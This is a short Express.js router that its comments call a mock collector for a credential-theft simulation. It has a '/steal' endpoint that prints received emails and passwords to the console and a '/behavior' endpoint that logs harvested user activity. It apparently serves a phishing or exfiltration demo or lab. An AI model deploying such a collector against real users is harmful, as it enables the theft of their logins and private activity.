const express = require('express');
const router = express.Router();

// Mock endpoint for credential theft simulation
router.post('/steal', (req, res) => {
    const { email, password } = req.body;
    console.log(`\n🚨 [COLLECTOR_ALERT] CREDENTIALS EXFILTRATED!`);
    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Password: ${password}`);
    console.log(`------------------------------------------`);
    res.status(200).json({ status: 'exfiltrated' });
});

// Mock endpoint for behavioral harvesting
router.post('/behavior', (req, res) => {
    const { user, event, data } = req.body;
    console.log(`\n👁️ [COLLECTOR_ALERT] BEHAVIORAL DATA CAPTURED!`);
    console.log(`👤 User: ${user}`);
    console.log(`📝 Event: ${event}`);
    console.log(`📊 Data: ${data}`);
    console.log(`------------------------------------------`);
    res.status(200).json({ status: 'harvested' });
});

module.exports = router;
